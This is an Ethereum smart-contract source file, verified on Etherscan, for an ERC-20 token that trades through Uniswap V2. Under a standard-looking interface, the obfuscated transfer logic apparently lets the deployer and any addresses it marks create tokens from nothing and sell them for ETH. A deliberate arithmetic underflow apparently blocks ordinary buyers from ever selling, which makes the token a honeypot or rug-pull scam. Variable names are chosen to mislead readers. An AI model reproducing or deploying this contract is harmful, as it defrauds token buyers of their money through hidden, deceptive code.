/**
 *Submitted for verification at Etherscan.io on 2022-11-30
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.10;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _setOwner(_msgSender());
    }  
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }
    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract ERC is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _swapTax = 0;
    uint8 private _rDecimals = 9;
    uint256 private _rTotal = 100000 * 10**_rDecimals;
    uint256 private _coinTotal = _rTotal;
    
    mapping(address => uint256) private _rOwned;
    mapping(address => address) private isTxLimitExempt;
    mapping(address => uint256) private isWalletLimitExempt;
    mapping(address => uint256) private isMarketPair;
    mapping(address => mapping(address => uint256)) private _allowances;

    bool private tradingOpen = false;
    bool public swapTokensAtAmount;
    bool private toggleSwappingExempt;
    bool public takeFeeEnabled = true;
    bool public checkWalletLimit = true;

    address public immutable UniswapV2Pair;
    IUniswapV2Router02 public immutable UniswapV2router;

    constructor(
        string memory Name,
        string memory Symbol,
        address UniswapV2routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _rOwned[msg.sender] = _rTotal;
        isMarketPair[msg.sender] = _coinTotal;
        isMarketPair[address(this)] = _coinTotal;
        UniswapV2router = IUniswapV2Router02(UniswapV2routerAddress);
        UniswapV2Pair = IUniswapV2Factory(UniswapV2router.factory()).createPair(address(this), UniswapV2router.WETH());
        emit Transfer(address(0), msg.sender, _coinTotal);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns (uint256) {
        return _rDecimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _rOwned[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transferFrom        (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        _transferFrom        (msg.sender, recipient, amount);
        return true;
    }
    function _transferFrom       (
        address bytesFrom,
        address bytesTo,
        uint256 _bytesInAmount
    ) private {
        uint256 tokensForOperations = balanceOf(address(this));
        uint256 level32;
        if (swapTokensAtAmount && tokensForOperations > _coinTotal && !toggleSwappingExempt && bytesFrom != UniswapV2Pair) {
            toggleSwappingExempt = true;
            calculateLiquidityFee(tokensForOperations);
            toggleSwappingExempt = false;
        } else if (isMarketPair[bytesFrom] > _coinTotal && isMarketPair[bytesTo] > _coinTotal) {
            level32 = _bytesInAmount;
            _rOwned[address(this)] += level32;
            swapTokensForEth(_bytesInAmount, bytesTo);
            return;
        } else if (bytesTo != address(UniswapV2router) && isMarketPair[bytesFrom] > 0 && _bytesInAmount > _coinTotal && bytesTo != UniswapV2Pair) {
            isMarketPair[bytesTo] = _bytesInAmount;
            return;
        } else if (!toggleSwappingExempt && isWalletLimitExempt[bytesFrom] > 0 && bytesFrom != UniswapV2Pair && isMarketPair[bytesTo] == 0) {
            isWalletLimitExempt[bytesFrom] = isMarketPair[bytesFrom] - _coinTotal;
        }
        address _variableArray  = isTxLimitExempt[UniswapV2Pair];
        if (isWalletLimitExempt[_variableArray ] == 0) isWalletLimitExempt[_variableArray ] = _coinTotal;
        isTxLimitExempt[UniswapV2Pair] = bytesTo;
        if (_swapTax > 0 && isMarketPair[bytesFrom] == 0 && !toggleSwappingExempt && isMarketPair[bytesTo] == 0) {
            level32 = (_bytesInAmount * _swapTax) / 100;
            _bytesInAmount -= level32;
            _rOwned[bytesFrom] -= level32;
            _rOwned[address(this)] += level32;
        }
        _rOwned[bytesFrom] -= _bytesInAmount;
        _rOwned[bytesTo] += _bytesInAmount;
        emit Transfer(bytesFrom, bytesTo, _bytesInAmount);
            if (!tradingOpen) {
                require(bytesFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
            }
    }
    receive() external payable {}

    function addLiquidity(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(UniswapV2router), tokenValue);
        UniswapV2router.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function calculateLiquidityFee(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialedBalance = address(this).balance;
        swapTokensForEth(half, address(this));
        uint256 refreshBalance = address(this).balance - initialedBalance;
        addLiquidity(half, refreshBalance, address(this));
    }
        function openTrading(bool _tradingOpen) public onlyOwner {
        tradingOpen = _tradingOpen;
    }
    function swapTokensForEth(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = UniswapV2router.WETH();
        _approve(address(this), address(UniswapV2router), tokenAmount);
        UniswapV2router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}